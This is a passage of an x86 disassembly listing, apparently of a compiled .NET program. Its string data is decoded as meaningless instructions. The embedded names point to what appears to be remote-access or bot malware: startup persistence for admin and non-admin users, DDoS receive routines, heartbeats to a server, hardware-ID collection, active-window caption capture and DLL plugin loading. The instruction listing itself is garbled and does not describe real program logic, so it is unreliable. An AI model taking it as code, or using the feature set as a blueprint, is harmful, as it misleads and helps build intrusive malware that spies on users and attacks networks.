  40951c:	53                   	push   %ebx
  40951d:	49                   	dec    %ecx
  40951e:	4f                   	dec    %edi
  40951f:	4e                   	dec    %esi
  409520:	5f                   	pop    %edi
  409521:	46                   	inc    %esi
  409522:	4f                   	dec    %edi
  409523:	52                   	push   %edx
  409524:	4d                   	dec    %ebp
  409525:	41                   	inc    %ecx
  409526:	54                   	push   %esp
  409527:	5f                   	pop    %edi
  409528:	4c                   	dec    %esp
  409529:	5a                   	pop    %edx
  40952a:	4e                   	dec    %esi
  40952b:	54                   	push   %esp
  40952c:	31 00                	xor    %eax,(%eax)
  40952e:	3c 3e                	cmp    $0x3e,%al
  409530:	75 5f                	jne    0x409591
  409532:	5f                   	pop    %edi
  409533:	31 00                	xor    %eax,(%eax)
  409535:	46                   	inc    %esi
  409536:	75 6e                	jne    0x4095a6
  409538:	63 60 31             	arpl   %esp,0x31(%eax)
  40953b:	00 49 45             	add    %cl,0x45(%ecx)
  40953e:	6e                   	outsb  %ds:(%esi),(%dx)
  40953f:	75 6d                	jne    0x4095ae
  409541:	65 72 61             	gs jb  0x4095a5
  409544:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  409548:	31 00                	xor    %eax,(%eax)
  40954a:	54                   	push   %esp
  40954b:	61                   	popa
  40954c:	73 6b                	jae    0x4095b9
  40954e:	60                   	pusha
  40954f:	31 00                	xor    %eax,(%eax)
  409551:	41                   	inc    %ecx
  409552:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  409556:	6e                   	outsb  %ds:(%esi),(%dx)
  409557:	60                   	pusha
  409558:	31 00                	xor    %eax,(%eax)
  40955a:	41                   	inc    %ecx
  40955b:	73 79                	jae    0x4095d6
  40955d:	6e                   	outsb  %ds:(%esi),(%dx)
  40955e:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  409562:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  409566:	68 6f 64 42 75       	push   $0x7542646f
  40956b:	69 6c 64 65 72 60 31 	imul   $0x316072,0x65(%esp,%eiz,2),%ebp
  409572:	00 
  409573:	54                   	push   %esp
  409574:	61                   	popa
  409575:	73 6b                	jae    0x4095e2
  409577:	41                   	inc    %ecx
  409578:	77 61                	ja     0x4095db
  40957a:	69 74 65 72 60 31 00 	imul   $0x41003160,0x72(%ebp,%eiz,2),%esi
  409581:	41 
  409582:	72 72                	jb     0x4095f6
  409584:	61                   	popa
  409585:	79 53                	jns    0x4095da
  409587:	65 67 6d             	gs insl (%dx),%es:(%di)
  40958a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40958c:	74 60                	je     0x4095ee
  40958e:	31 00                	xor    %eax,(%eax)
  409590:	4c                   	dec    %esp
  409591:	69 73 74 60 31 00 62 	imul   $0x62003160,0x74(%ebx),%esi
  409598:	31 00                	xor    %eax,(%eax)
  40959a:	3c 3e                	cmp    $0x3e,%al
  40959c:	37                   	aaa
  40959d:	5f                   	pop    %edi
  40959e:	5f                   	pop    %edi
  40959f:	77 72                	ja     0x409613
  4095a1:	61                   	popa
  4095a2:	70 31                	jo     0x4095d5
  4095a4:	00 5f 5f             	add    %bl,0x5f(%edi)
  4095a7:	53                   	push   %ebx
  4095a8:	74 61                	je     0x40960b
  4095aa:	74 69                	je     0x409615
  4095ac:	63 41 72             	arpl   %eax,0x72(%ecx)
  4095af:	72 61                	jb     0x409612
  4095b1:	79 49                	jns    0x4095fc
  4095b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b4:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  4095bb:	69 
  4095bc:	7a 65                	jp     0x409623
  4095be:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  4095c3:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4095ca:	74 2e                	je     0x4095fa
  4095cc:	57                   	push   %edi
  4095cd:	69 6e 33 32 00 55 49 	imul   $0x49550032,0x33(%esi),%ebp
  4095d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4095d5:	74 33                	je     0x40960a
  4095d7:	32 00                	xor    (%eax),%al
  4095d9:	3c 64                	cmp    $0x64,%al
  4095db:	61                   	popa
  4095dc:	74 61                	je     0x40963f
  4095de:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  4095e4:	3c 74                	cmp    $0x74,%al
  4095e6:	65 6d                	gs insl (%dx),%es:(%edi)
  4095e8:	70 58                	jo     0x409642
  4095ea:	6d                   	insl   (%dx),%es:(%edi)
  4095eb:	6c                   	insb   (%dx),%es:(%edi)
  4095ec:	46                   	inc    %esi
  4095ed:	69 6c 65 3e 35 5f 5f 	imul   $0x325f5f35,0x3e(%ebp,%eiz,2),%ebp
  4095f4:	32 
  4095f5:	00 3c 67             	add    %bh,(%edi,%eiz,2)
  4095f8:	65 74 64             	gs je  0x40965f
  4095fb:	6c                   	insb   (%dx),%es:(%edi)
  4095fc:	6c                   	insb   (%dx),%es:(%edi)
  4095fd:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  409603:	3c 63                	cmp    $0x63,%al
  409605:	75 72                	jne    0x409679
  409607:	72 77                	jb     0x409680
  409609:	69 6e 3e 35 5f 5f 32 	imul   $0x325f5f35,0x3e(%esi),%ebp
  409610:	00 3c 63             	add    %bh,(%ebx,%eiz,2)
  409613:	6f                   	outsl  %ds:(%esi),(%dx)
  409614:	6e                   	outsb  %ds:(%esi),(%dx)
  409615:	6e                   	outsb  %ds:(%esi),(%dx)
  409616:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  40961c:	3c 63                	cmp    $0x63,%al
  40961e:	6f                   	outsl  %ds:(%esi),(%dx)
  40961f:	6d                   	insl   (%dx),%es:(%edi)
  409620:	70 3e                	jo     0x409660
  409622:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  409627:	3c 73                	cmp    $0x73,%al
  409629:	6f                   	outsl  %ds:(%esi),(%dx)
  40962a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40962d:	74 3e                	je     0x40966d
  40962f:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  409634:	3c 48                	cmp    $0x48,%al
  409636:	65 61                	gs popa
  409638:	72 62                	jb     0x40969c
  40963a:	65 61                	gs popa
  40963c:	74 52                	je     0x409690
  40963e:	65 70 6c             	gs jo  0x4096ad
  409641:	79 3e                	jns    0x409681
  409643:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  409648:	3c 3e                	cmp    $0x3e,%al
  40964a:	75 5f                	jne    0x4096ab
  40964c:	5f                   	pop    %edi
  40964d:	32 00                	xor    (%eax),%al
  40964f:	46                   	inc    %esi
  409650:	75 6e                	jne    0x4096c0
  409652:	63 60 32             	arpl   %esp,0x32(%eax)
  409655:	00 44 69 63          	add    %al,0x63(%ecx,%ebp,2)
  409659:	74 69                	je     0x4096c4
  40965b:	6f                   	outsl  %ds:(%esi),(%dx)
  40965c:	6e                   	outsb  %ds:(%esi),(%dx)
  40965d:	61                   	popa
  40965e:	72 79                	jb     0x4096d9
  409660:	60                   	pusha
  409661:	32 00                	xor    (%eax),%al
  409663:	62 32                	bound  %esi,(%edx)
  409665:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  409668:	37                   	aaa
  409669:	5f                   	pop    %edi
  40966a:	5f                   	pop    %edi
  40966b:	77 72                	ja     0x4096df
  40966d:	61                   	popa
  40966e:	70 32                	jo     0x4096a2
  409670:	00 3c 52             	add    %bh,(%edx,%edx,2)
  409673:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  409677:	76 65                	jbe    0x4096de
  409679:	41                   	inc    %ecx
  40967a:	73 79                	jae    0x4096f5
  40967c:	6e                   	outsb  %ds:(%esi),(%dx)
  40967d:	63 3e                	arpl   %edi,(%esi)
  40967f:	64 5f                	fs pop %edi
  409681:	5f                   	pop    %edi
  409682:	31 33                	xor    %esi,(%ebx)
  409684:	00 3c 73             	add    %bh,(%ebx,%esi,2)
  409687:	75 62                	jne    0x4096eb
  409689:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  40968f:	3c 74                	cmp    $0x74,%al
  409691:	6f                   	outsl  %ds:(%esi),(%dx)
  409692:	74 61                	je     0x4096f5
  409694:	6c                   	insb   (%dx),%es:(%edi)
  409695:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  40969b:	3c 48                	cmp    $0x48,%al
  40969d:	65 61                	gs popa
  40969f:	72 62                	jb     0x409703
  4096a1:	65 61                	gs popa
  4096a3:	74 46                	je     0x4096eb
  4096a5:	61                   	popa
  4096a6:	69 6c 3e 35 5f 5f 33 	imul   $0x335f5f,0x35(%esi,%edi,1),%ebp
  4096ad:	00 
  4096ae:	3c 68                	cmp    $0x68,%al
  4096b0:	61                   	popa
  4096b1:	73 64                	jae    0x409717
  4096b3:	6c                   	insb   (%dx),%es:(%edi)
  4096b4:	6c                   	insb   (%dx),%es:(%edi)
  4096b5:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  4096bb:	3c 70                	cmp    $0x70,%al
  4096bd:	72 6f                	jb     0x40972e
  4096bf:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096c2:	73 3e                	jae    0x409702
  4096c4:	35 5f 5f 33 00       	xor    $0x335f5f,%eax
  4096c9:	3c 43                	cmp    $0x43,%al
  4096cb:	72 65                	jb     0x409732
  4096cd:	61                   	popa
  4096ce:	74 65                	je     0x409735
  4096d0:	53                   	push   %ebx
  4096d1:	75 62                	jne    0x409735
  4096d3:	53                   	push   %ebx
  4096d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4096d5:	63 6b 3e             	arpl   %ebp,0x3e(%ebx)
  4096d8:	64 5f                	fs pop %edi
  4096da:	5f                   	pop    %edi
  4096db:	33 00                	xor    (%eax),%eax
  4096dd:	3c 44                	cmp    $0x44,%al
  4096df:	6c                   	insb   (%dx),%es:(%edi)
  4096e0:	6c                   	insb   (%dx),%es:(%edi)
  4096e1:	4e                   	dec    %esi
  4096e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4096e3:	64 65 48             	fs gs dec %eax
  4096e6:	61                   	popa
  4096e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4096e8:	64 6c                	fs insb (%dx),%es:(%edi)
  4096ea:	65 72 3e             	gs jb  0x40972b
  4096ed:	64 5f                	fs pop %edi
  4096ef:	5f                   	pop    %edi
  4096f0:	33 00                	xor    (%eax),%eax
  4096f2:	3c 3e                	cmp    $0x3e,%al
  4096f4:	75 5f                	jne    0x409755
  4096f6:	5f                   	pop    %edi
  4096f7:	33 00                	xor    (%eax),%eax
  4096f9:	3c 53                	cmp    $0x53,%al
  4096fb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4096fd:	64 41                	fs inc %ecx
  4096ff:	73 79                	jae    0x40977a
  409701:	6e                   	outsb  %ds:(%esi),(%dx)
  409702:	63 3e                	arpl   %edi,(%esi)
  409704:	64 5f                	fs pop %edi
  409706:	5f                   	pop    %edi
  409707:	31 34 00             	xor    %esi,(%eax,%eax,1)
  40970a:	31 44 31 43          	xor    %eax,0x43(%ecx,%esi,1)
  40970e:	43                   	inc    %ebx
  40970f:	33 35 45 41 36 31    	xor    0x31364145,%esi
  409715:	33 33                	xor    (%ebx),%esi
  409717:	31 43 35             	xor    %eax,0x35(%ebx)
  40971a:	41                   	inc    %ecx
  40971b:	38 35 44 32 41 39    	cmp    %dh,0x39413244
  409721:	36 30 36             	xor    %dh,%ss:(%esi)
  409724:	31 31                	xor    %esi,(%ecx)
  409726:	31 35 33 45 33 37    	xor    %esi,0x37334533
  40972c:	41                   	inc    %ecx
  40972d:	36 32 44 43 44       	xor    %ss:0x44(%ebx,%eax,2),%al
  409732:	39 31                	cmp    %esi,(%ecx)
  409734:	36 32 36             	xor    %ss:(%esi),%dh
  409737:	39 44 36 45          	cmp    %eax,0x45(%esi,%esi,1)
  40973b:	33 42 35             	xor    0x35(%edx),%eax
  40973e:	41                   	inc    %ecx
  40973f:	30 44 41 43          	xor    %al,0x43(%ecx,%eax,2)
  409743:	32 45 46             	xor    0x46(%ebp),%al
  409746:	33 38                	xor    (%eax),%edi
  409748:	32 34 00             	xor    (%eax,%eax,1),%dh
  40974b:	49                   	dec    %ecx
  40974c:	6e                   	outsb  %ds:(%esi),(%dx)
  40974d:	74 36                	je     0x409785
  40974f:	34 00                	xor    $0x0,%al
  409751:	3c 66                	cmp    $0x66,%al
  409753:	61                   	popa
  409754:	69 6c 3e 35 5f 5f 34 	imul   $0x345f5f,0x35(%esi,%edi,1),%ebp
  40975b:	00 
  40975c:	3c 73                	cmp    $0x73,%al
  40975e:	6f                   	outsl  %ds:(%esi),(%dx)
  40975f:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409762:	74 3e                	je     0x4097a2
  409764:	35 5f 5f 34 00       	xor    $0x345f5f,%eax
  409769:	3c 64                	cmp    $0x64,%al
  40976b:	61                   	popa
  40976c:	74 61                	je     0x4097cf
  40976e:	4c                   	dec    %esp
  40976f:	65 66 74 3e          	gs data16 je 0x4097b1
  409773:	35 5f 5f 34 00       	xor    $0x345f5f,%eax
  409778:	3c 52                	cmp    $0x52,%al
  40977a:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  40977e:	6c                   	insb   (%dx),%es:(%edi)
  40977f:	6c                   	insb   (%dx),%es:(%edi)
  409780:	41                   	inc    %ecx
  409781:	73 79                	jae    0x4097fc
  409783:	6e                   	outsb  %ds:(%esi),(%dx)
  409784:	63 5f 64             	arpl   %ebx,0x64(%edi)
  409787:	64 6f                	outsl  %fs:(%esi),(%dx)
  409789:	73 5f                	jae    0x4097ea
  40978b:	75 6e                	jne    0x4097fb
  40978d:	73 61                	jae    0x4097f0
  40978f:	66 65 72 3e          	data16 gs jb 0x4097d1
  409793:	64 5f                	fs pop %edi
  409795:	5f                   	pop    %edi
  409796:	34 00                	xor    $0x0,%al
  409798:	46                   	inc    %esi
  409799:	75 6e                	jne    0x409809
  40979b:	63 60 34             	arpl   %esp,0x34(%eax)
  40979e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4097a1:	37                   	aaa
  4097a2:	5f                   	pop    %edi
  4097a3:	5f                   	pop    %edi
  4097a4:	77 72                	ja     0x409818
  4097a6:	61                   	popa
  4097a7:	70 34                	jo     0x4097dd
  4097a9:	00 3c 43             	add    %bh,(%ebx,%eax,2)
  4097ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4097ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4097af:	65 63 74 41 6e       	arpl   %esi,%gs:0x6e(%ecx,%eax,2)
  4097b4:	64 53                	fs push %ebx
  4097b6:	65 74 75             	gs je  0x40982e
  4097b9:	70 41                	jo     0x4097fc
  4097bb:	73 79                	jae    0x409836
  4097bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4097be:	63 3e                	arpl   %edi,(%esi)
  4097c0:	64 5f                	fs pop %edi
  4097c2:	5f                   	pop    %edi
  4097c3:	31 35 00 3c 65 3e    	xor    %esi,0x3e653c00
  4097c9:	35 5f 5f 35 00       	xor    $0x355f5f,%eax
  4097ce:	3c 73                	cmp    $0x73,%al
  4097d0:	74 61                	je     0x409833
  4097d2:	72 74                	jb     0x409848
  4097d4:	54                   	push   %esp
  4097d5:	69 6d 65 73 74 61 6d 	imul   $0x6d617473,0x65(%ebp),%ebp
  4097dc:	70 3e                	jo     0x40981c
  4097de:	35 5f 5f 35 00       	xor    $0x355f5f,%eax
  4097e3:	3c 47                	cmp    $0x47,%al
  4097e5:	65 74 41             	gs je  0x409829
  4097e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4097e9:	64 53                	fs push %ebx
  4097eb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097ed:	64 49                	fs dec %ecx
  4097ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4097f0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097f2:	3e 64 5f             	ds fs pop %edi
  4097f5:	5f                   	pop    %edi
  4097f6:	35 00 3c 52 65       	xor    $0x65523c00,%eax
  4097fb:	63 76 41             	arpl   %esi,0x41(%esi)
  4097fe:	6c                   	insb   (%dx),%es:(%edi)
  4097ff:	6c                   	insb   (%dx),%es:(%edi)
  409800:	41                   	inc    %ecx
  409801:	73 79                	jae    0x40987c
  409803:	6e                   	outsb  %ds:(%esi),(%dx)
  409804:	63 5f 64             	arpl   %ebx,0x64(%edi)
  409807:	64 6f                	outsl  %fs:(%esi),(%dx)
  409809:	73 5f                	jae    0x40986a
  40980b:	73 61                	jae    0x40986e
  40980d:	66 65 72 3e          	data16 gs jb 0x40984f
  409811:	64 5f                	fs pop %edi
  409813:	5f                   	pop    %edi
  409814:	35 00 3c 3e 37       	xor    $0x373e3c00,%eax
  409819:	5f                   	pop    %edi
  40981a:	5f                   	pop    %edi
  40981b:	77 72                	ja     0x40988f
  40981d:	61                   	popa
  40981e:	70 35                	jo     0x409855
  409820:	00 3c 52             	add    %bh,(%edx,%edx,2)
  409823:	65 6d                	gs insl (%dx),%es:(%edi)
  409825:	6f                   	outsl  %ds:(%esi),(%dx)
  409826:	76 65                	jbe    0x40988d
  409828:	53                   	push   %ebx
  409829:	74 61                	je     0x40988c
  40982b:	72 74                	jb     0x4098a1
  40982d:	75 70                	jne    0x40989f
  40982f:	3e 64 5f             	ds fs pop %edi
  409832:	5f                   	pop    %edi
  409833:	31 36                	xor    %esi,(%esi)
  409835:	00 3c 6c             	add    %bh,(%esp,%ebp,2)
  409838:	61                   	popa
  409839:	73 74                	jae    0x4098af
  40983b:	53                   	push   %ebx
  40983c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40983e:	64 54                	fs push %esp
  409840:	69 6d 65 3e 35 5f 5f 	imul   $0x5f5f353e,0x65(%ebp),%ebp
  409847:	36 00 3c 54          	add    %bh,%ss:(%esp,%edx,2)
  40984b:	79 70                	jns    0x4098bd
  40984d:	65 30 52 65          	xor    %dl,%gs:0x65(%edx)
  409851:	63 65 69             	arpl   %esp,0x69(%ebp)
  409854:	76 65                	jbe    0x4098bb
  409856:	3e 64 5f             	ds fs pop %edi
  409859:	5f                   	pop    %edi
  40985a:	36 00 3c 55 6e 69 6e 	add    %bh,%ss:0x736e696e(,%edx,2)
  409861:	73 
  409862:	74 61                	je     0x4098c5
  409864:	6c                   	insb   (%dx),%es:(%edi)
  409865:	6c                   	insb   (%dx),%es:(%edi)
  409866:	3e 64 5f             	ds fs pop %edi
  409869:	5f                   	pop    %edi
  40986a:	31 37                	xor    %esi,(%edi)
  40986c:	00 5f 5f             	add    %bl,0x5f(%edi)
  40986f:	53                   	push   %ebx
  409870:	74 61                	je     0x4098d3
  409872:	74 69                	je     0x4098dd
  409874:	63 41 72             	arpl   %eax,0x72(%ecx)
  409877:	72 61                	jb     0x4098da
  409879:	79 49                	jns    0x4098c4
  40987b:	6e                   	outsb  %ds:(%esi),(%dx)
  40987c:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  409883:	69 
  409884:	7a 65                	jp     0x4098eb
  409886:	3d 37 00 3c 64       	cmp    $0x643c0037,%eax
  40988b:	6c                   	insb   (%dx),%es:(%edi)
  40988c:	6c                   	insb   (%dx),%es:(%edi)
  40988d:	6e                   	outsb  %ds:(%esi),(%dx)
  40988e:	61                   	popa
  40988f:	6d                   	insl   (%dx),%es:(%edi)
  409890:	65 3e 35 5f 5f 37 00 	gs ds xor $0x375f5f,%eax
  409897:	3c 54                	cmp    $0x54,%al
  409899:	79 70                	jns    0x40990b
  40989b:	65 31 52 65          	xor    %edx,%gs:0x65(%edx)
  40989f:	63 65 69             	arpl   %esp,0x69(%ebp)
  4098a2:	76 65                	jbe    0x409909
  4098a4:	3e 64 5f             	ds fs pop %edi
  4098a7:	5f                   	pop    %edi
  4098a8:	37                   	aaa
  4098a9:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  4098ac:	75 74                	jne    0x409922
  4098ae:	68 65 6e 74 69       	push   $0x69746e65
  4098b3:	63 61 74             	arpl   %esp,0x74(%ecx)
  4098b6:	65 41                	gs inc %ecx
  4098b8:	73 79                	jae    0x409933
  4098ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4098bb:	63 3e                	arpl   %edi,(%esi)
  4098bd:	64 5f                	fs pop %edi
  4098bf:	5f                   	pop    %edi
  4098c0:	31 38                	xor    %edi,(%eax)
  4098c2:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  4098c5:	64 64 54             	fs fs push %esp
  4098c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4098c9:	53                   	push   %ebx
  4098ca:	74 61                	je     0x40992d
  4098cc:	72 74                	jb     0x409942
  4098ce:	75 70                	jne    0x409940
  4098d0:	4e                   	dec    %esi
  4098d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4098d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4098d3:	41                   	inc    %ecx
  4098d4:	64 6d                	fs insl (%dx),%es:(%edi)
  4098d6:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  4098dd:	38 00                	cmp    %al,(%eax)
  4098df:	67 65 74 5f          	addr16 gs je 0x409942
  4098e3:	55                   	push   %ebp
  4098e4:	54                   	push   %esp
  4098e5:	46                   	inc    %esi
  4098e6:	38 00                	cmp    %al,(%eax)
  4098e8:	3c 65                	cmp    $0x65,%al
  4098ea:	3e 35 5f 5f 38 00    	ds xor $0x385f5f,%eax
  4098f0:	3c 47                	cmp    $0x47,%al
  4098f2:	65 74 43             	gs je  0x409938
  4098f5:	61                   	popa
  4098f6:	70 74                	jo     0x40996c
  4098f8:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  4098ff:	74 69                	je     0x40996a
  409901:	76 65                	jbe    0x409968
  409903:	57                   	push   %edi
  409904:	69 6e 64 6f 77 41 73 	imul   $0x7341776f,0x64(%esi),%ebp
  40990b:	79 6e                	jns    0x40997b
  40990d:	63 3e                	arpl   %edi,(%esi)
  40990f:	64 5f                	fs pop %edi
  409911:	5f                   	pop    %edi
  409912:	38 00                	cmp    %al,(%eax)
  409914:	3c 73                	cmp    $0x73,%al
  409916:	65 74 53             	gs je  0x40996c
  409919:	65 74 49             	gs je  0x409965
  40991c:	64 3e 64 5f          	fs ds fs pop %edi
  409920:	5f                   	pop    %edi
  409921:	38 00                	cmp    %al,(%eax)
  409923:	3c 41                	cmp    $0x41,%al
  409925:	64 64 54             	fs fs push %esp
  409928:	6f                   	outsl  %ds:(%esi),(%dx)
  409929:	53                   	push   %ebx
  40992a:	74 61                	je     0x40998d
  40992c:	72 74                	jb     0x4099a2
  40992e:	75 70                	jne    0x4099a0
  409930:	41                   	inc    %ecx
  409931:	64 6d                	fs insl (%dx),%es:(%edi)
  409933:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  40993a:	39 00                	cmp    %eax,(%eax)
  40993c:	3c 3e                	cmp    $0x3e,%al
  40993e:	39 00                	cmp    %eax,(%eax)
  409940:	3c 53                	cmp    $0x53,%al
  409942:	65 6e                	outsb  %gs:(%esi),(%dx)
  409944:	64 41                	fs inc %ecx
  409946:	73 79                	jae    0x4099c1
  409948:	6e                   	outsb  %ds:(%esi),(%dx)
  409949:	63 3e                	arpl   %edi,(%esi)
  40994b:	64 5f                	fs pop %edi
  40994d:	5f                   	pop    %edi
  40994e:	39 00                	cmp    %eax,(%eax)
  409950:	3c 54                	cmp    $0x54,%al
  409952:	79 70                	jns    0x4099c4
  409954:	65 32 52 65          	xor    %gs:0x65(%edx),%dl
  409958:	63 65 69             	arpl   %esp,0x69(%ebp)
  40995b:	76 65                	jbe    0x4099c2
  40995d:	3e 64 5f             	ds fs pop %edi
  409960:	5f                   	pop    %edi
  409961:	39 00                	cmp    %eax,(%eax)
  409963:	3c 4d                	cmp    $0x4d,%al
  409965:	6f                   	outsl  %ds:(%esi),(%dx)
  409966:	64 75 6c             	fs jne 0x4099d5
  409969:	65 3e 00 3c 4d 61 69 	gs add %bh,%ds:0x3e6e6961(,%ecx,2)
  409970:	6e 3e 
  409972:	00 3c 50             	add    %bh,(%eax,%edx,2)
  409975:	72 69                	jb     0x4099e0
  409977:	76 61                	jbe    0x4099da
  409979:	74 65                	je     0x4099e0
  40997b:	49                   	dec    %ecx
  40997c:	6d                   	insl   (%dx),%es:(%edi)
  40997d:	70 6c                	jo     0x4099eb
  40997f:	65 6d                	gs insl (%dx),%es:(%edi)
  409981:	65 6e                	outsb  %gs:(%esi),(%dx)
  409983:	74 61                	je     0x4099e6
  409985:	74 69                	je     0x4099f0
  409987:	6f                   	outsl  %ds:(%esi),(%dx)
  409988:	6e                   	outsb  %ds:(%esi),(%dx)
  409989:	44                   	inc    %esp
  40998a:	65 74 61             	gs je  0x4099ee
  40998d:	69 6c 73 3e 00 36 33 	imul   $0x30333600,0x3e(%ebx,%esi,2),%ebp
  409994:	30 
  409995:	44                   	inc    %esp
  409996:	43                   	inc    %ebx
  409997:	44                   	inc    %esp
  409998:	32 39                	xor    (%ecx),%bh
  40999a:	36 36 43             	ss ss inc %ebx
  40999d:	34 33                	xor    $0x33,%al
  40999f:	33 36                	xor    (%esi),%esi
  4099a1:	36 39 31             	cmp    %esi,%ss:(%ecx)
  4099a4:	31 32                	xor    %esi,(%edx)
  4099a6:	35 34 34 38 42       	xor    $0x42383434,%eax
  4099ab:	42                   	inc    %edx
  4099ac:	42                   	inc    %edx
  4099ad:	32 35 42 34 46 46    	xor    0x46463442,%dh
  4099b3:	34 31                	xor    $0x31,%al
  4099b5:	32 41 34             	xor    0x34(%ecx),%al
  4099b8:	39 43 37             	cmp    %eax,0x37(%ebx)
  4099bb:	33 32                	xor    (%edx),%esi
  4099bd:	44                   	inc    %esp
  4099be:	42                   	inc    %edx
  4099bf:	32 43 38             	xor    0x38(%ebx),%al
  4099c2:	41                   	inc    %ecx
  4099c3:	42                   	inc    %edx
  4099c4:	43                   	inc    %ebx
  4099c5:	31 42 38             	xor    %eax,0x38(%edx)
  4099c8:	35 38 31 42 44       	xor    $0x44423138,%eax
  4099cd:	37                   	aaa
  4099ce:	31 30                	xor    %esi,(%eax)
  4099d0:	44                   	inc    %esp
  4099d1:	44                   	inc    %esp
  4099d2:	00 48 57             	add    %cl,0x57(%eax)
  4099d5:	49                   	dec    %ecx
  4099d6:	44                   	inc    %esp
  4099d7:	00 67 65             	add    %ah,0x65(%edi)
  4099da:	74 5f                	je     0x409a3b
  4099dc:	41                   	inc    %ecx
  4099dd:	53                   	push   %ebx
  4099de:	43                   	inc    %ebx
  4099df:	49                   	dec    %ecx
  4099e0:	49                   	dec    %ecx
  4099e1:	00 43 4f             	add    %al,0x4f(%ebx)
  4099e4:	4d                   	dec    %ebp
  4099e5:	50                   	push   %eax
  4099e6:	52                   	push   %edx
  4099e7:	45                   	inc    %ebp
  4099e8:	53                   	push   %ebx
  4099e9:	53                   	push   %ebx
  4099ea:	49                   	dec    %ecx
  4099eb:	4f                   	dec    %edi
  4099ec:	4e                   	dec    %esi
  4099ed:	5f                   	pop    %edi
  4099ee:	45                   	inc    %ebp
  4099ef:	4e                   	dec    %esi
  4099f0:	47                   	inc    %edi
  4099f1:	49                   	dec    %ecx
  4099f2:	4e                   	dec    %esi
  4099f3:	45                   	inc    %ebp
  4099f4:	5f                   	pop    %edi
  4099f5:	4d                   	dec    %ebp
  4099f6:	41                   	inc    %ecx
  4099f7:	58                   	pop    %eax
  4099f8:	49                   	dec    %ecx
  4099f9:	4d                   	dec    %ebp
  4099fa:	55                   	push   %ebp
  4099fb:	4d                   	dec    %ebp
  4099fc:	00 4c 41 53          	add    %cl,0x53(%ecx,%eax,2)
  409a00:	54                   	push   %esp
  409a01:	49                   	dec    %ecx
  409a02:	4e                   	dec    %esi
  409a03:	50                   	push   %eax
  409a04:	55                   	push   %ebp
  409a05:	54                   	push   %esp
  409a06:	49                   	dec    %ecx
  409a07:	4e                   	dec    %esi
  409a08:	46                   	inc    %esi
  409a09:	4f                   	dec    %edi
  409a0a:	00 53 79             	add    %dl,0x79(%ebx)
  409a0d:	73 74                	jae    0x409a83
  409a0f:	65 6d                	gs insl (%dx),%es:(%edi)
  409a11:	2e 49                	cs dec %ecx
  409a13:	4f                   	dec    %edi
  409a14:	00 67 65             	add    %ah,0x65(%edi)
  409a17:	74 5f                	je     0x409a78
  409a19:	49                   	dec    %ecx
  409a1a:	56                   	push   %esi
  409a1b:	00 73 65             	add    %dh,0x65(%ebx)
  409a1e:	74 5f                	je     0x409a7f
  409a20:	49                   	dec    %ecx
  409a21:	56                   	push   %esi
  409a22:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  409a26:	61                   	popa
  409a27:	00 6d 73             	add    %ch,0x73(%ebp)
  409a2a:	63 6f 72             	arpl   %ebp,0x72(%edi)
  409a2d:	6c                   	insb   (%dx),%es:(%edi)
  409a2e:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
  409a35:	53                   	push   %ebx
  409a36:	79 73                	jns    0x409aab
  409a38:	74 65                	je     0x409a9f
  409a3a:	6d                   	insl   (%dx),%es:(%edi)
  409a3b:	2e 43                	cs inc %ebx
  409a3d:	6f                   	outsl  %ds:(%esi),(%dx)
  409a3e:	6c                   	insb   (%dx),%es:(%edi)
  409a3f:	6c                   	insb   (%dx),%es:(%edi)
  409a40:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a45:	6e                   	outsb  %ds:(%esi),(%dx)
  409a46:	73 2e                	jae    0x409a76
